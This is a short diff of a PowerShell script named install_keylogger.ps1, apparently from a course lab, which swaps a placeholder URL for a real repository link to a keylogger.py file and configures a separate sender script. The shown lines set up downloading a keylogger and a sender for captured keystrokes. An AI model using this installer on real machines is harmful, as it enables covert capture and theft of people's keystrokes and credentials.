@@ -1,7 +1,7 @@
 # install_keylogger.ps1
 
 # Configuration
-$PythonKeyloggerUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/keylogger.py"
+$PythonKeyloggerUrl = "https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Keylogger/keylogger.py"
 $PythonSenderUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/sender.py" # Assuming you might separate sender logic later
 $KeyloggerFileName = "keylogger.py"
 $SenderFileName = "sender.py"
